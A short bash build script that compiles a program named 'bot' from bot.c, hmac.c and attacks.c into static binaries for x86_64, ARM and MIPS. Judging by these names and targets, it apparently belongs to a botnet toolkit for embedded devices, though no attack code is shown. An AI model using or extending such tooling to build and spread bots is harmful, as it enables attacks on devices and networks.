#!/bin/bash

echo "Building bots with different configs..."

mkdir -p binaries

# Build x86_64 with config_x86_64.h
echo "  Building x86_64..."
gcc -o binaries/bot_x86_64 bot/bot.c bot/hmac.c bot/attacks.c -lpthread -ldl -Wall -O2

# Build ARM with config_arm.h (if it exists)
if [ -f bot/config_arm.h ]; then
    echo "  Building ARM..."
    cp bot/config_arm.h bot/config.h
    arm-linux-gnueabi-gcc -o binaries/bot_arm bot/bot.c bot/hmac.c bot/attacks.c -lpthread -ldl -static -O2
    cp bot/config_x86_64.h bot/config.h  # Restore
fi

# Build MIPS with config_mips.h (if it exists)
if [ -f bot/config_mips.h ]; then
    echo "  Building MIPS..."
    cp bot/config_mips.h bot/config.h
    mips-linux-gnu-gcc -o binaries/bot_mips bot/bot.c bot/hmac.c bot/attacks.c -lpthread -ldl -static -O2
    cp bot/config_x86_64.h bot/config.h  # Restore
fi

echo ""
echo "✅ Build complete!"
ls -lh binaries/
